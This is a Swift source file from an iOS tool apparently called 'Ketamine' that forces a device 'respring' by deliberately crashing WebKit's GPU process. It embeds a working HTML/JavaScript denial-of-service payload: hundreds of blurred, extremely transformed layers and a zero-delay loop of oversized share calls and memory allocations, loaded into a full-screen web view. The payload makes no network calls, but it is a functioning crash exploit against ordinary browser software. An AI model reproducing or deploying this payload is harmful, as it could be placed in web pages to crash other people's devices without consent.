//
//  RespringHelper.swift
//  Ketamine
//
//  Mond-style instant respring (WebKit GPU crash @neonmodder123).
//  WKWebView on a top-level window, load the crash payload immediately.
//

import Foundation
import UIKit
import WebKit

enum RespringHelper {

    private static var stickyWindow: UIWindow?
    private static var stickyWebView: WKWebView?

    private static let crashHTML = """
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"></head><body><script>
    (function(){
      var c=document.createElement('div');
      c.style.cssText='perspective:1px;perspective-origin:9999999% 9999999%;';
      document.body.appendChild(c);
      for(var i=0;i<500;i++){
        var d=document.createElement('div');
        d.style.cssText='position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);';
        c.appendChild(d);
      }
      setInterval(function(){
        try{navigator.share({title:'R',text:'R'.repeat(100000)});}catch(e){}
        try{crypto.getRandomValues(new Uint8Array(1024*1024*10));}catch(e){}
      },0);
    })();
    </script></body></html>
    """

    static func respring() {
        #if targetEnvironment(simulator)
        print("respring skipped on simulator")
        return
        #else
        if !Thread.isMainThread {
            DispatchQueue.main.async { fireNow() }
            return
        }
        fireNow()
        #endif
    }

    private static func fireNow() {
        UIImpactFeedbackGenerator(style: .heavy).impactOccurred()

        let config = WKWebViewConfiguration()
        config.websiteDataStore = .nonPersistent()
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        config.defaultWebpagePreferences = prefs
        config.processPool = WKProcessPool()

        let webView = WKWebView(frame: UIScreen.main.bounds, configuration: config)
        webView.isOpaque = false
        webView.backgroundColor = .black
        webView.scrollView.isScrollEnabled = false
        webView.scrollView.backgroundColor = .black

        webView.loadHTMLString(crashHTML, baseURL: URL(string: "about:blank"))
        stickyWebView = webView

        let scenes = UIApplication.shared.connectedScenes.compactMap { $0 as? UIWindowScene }
        let scene = scenes.first(where: { $0.activationState == .foregroundActive }) ?? scenes.first

        let window: UIWindow
        if let scene {
            window = UIWindow(windowScene: scene)
            window.frame = scene.coordinateSpace.bounds
        } else {
            window = UIWindow(frame: UIScreen.main.bounds)
        }
        window.windowLevel = .alert + 100
        window.backgroundColor = .black
        window.isHidden = false

        let host = UIViewController()
        host.view.backgroundColor = .black
        host.view.addSubview(webView)
        webView.frame = host.view.bounds
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        window.rootViewController = host
        window.makeKeyAndVisible()
        stickyWindow = window

        window.layoutIfNeeded()
        webView.setNeedsLayout()
        webView.layoutIfNeeded()

        webView.loadHTMLString(crashHTML, baseURL: nil)
    }
}
